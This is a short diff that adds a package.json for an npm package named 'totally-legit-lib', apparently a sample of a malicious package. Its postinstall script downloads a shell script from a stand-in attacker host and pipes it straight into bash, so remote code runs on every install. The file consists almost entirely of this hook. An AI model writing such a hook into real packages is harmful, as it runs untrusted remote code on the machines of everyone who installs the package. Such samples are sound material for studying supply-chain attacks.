@@ -1,0 +1,8 @@
+{
+  "name": "totally-legit-lib",
+  "version": "1.0.0",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -s https://example-attacker.test/setup.sh | bash"
+  }
+}
